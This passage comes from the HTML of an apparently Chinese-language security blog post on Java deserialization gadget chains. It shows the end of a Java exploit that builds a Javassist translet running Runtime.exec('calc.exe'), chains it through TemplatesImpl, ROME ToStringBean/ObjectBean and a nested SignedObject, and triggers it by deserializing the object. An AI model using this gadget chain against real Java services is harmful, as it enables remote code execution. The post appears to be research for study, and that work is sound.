class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);  </span><br><span class="line">        ctClass.setSuperclass(superClass);  </span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();  </span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);  </span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);  </span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;ROME2&quot;</span>);  </span><br><span class="line">        <span class="comment">//HashMap2设置成ROME2的入口  </span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);  </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean2);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        hashMap2.put(objectBean2, <span class="string">&quot;hashMap2&quot;</span>);  </span><br><span class="line">        <span class="comment">//设置SignedObject，把HashMap2给绑上去  </span></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);  </span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);  </span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();  </span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMap2, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));  </span><br><span class="line">        <span class="comment">//HashMap1设置为ROME1的入口,SignedObject成为ROME1的出口  </span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);  </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean1);  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        hashMap1.put(objectBean1, <span class="string">&quot;hashMap1&quot;</span>);  </span><br><span class="line">        deserialize(serialize(hashMap1));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829235356.png"></p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2023/09/05/HackTheBox(support)/"
+      title="HackTheBox:Support"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        HackTheBox:Support
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2023/08/21/Frida%20%E5%88%9D%E4%BD%93%E9%AA%8C/"
+      title="Frida的甜蜜初体验"
+     >
+
+    <p class="title-text">
+      
+        Frida的甜蜜初体验
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2026 F4miti0n<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
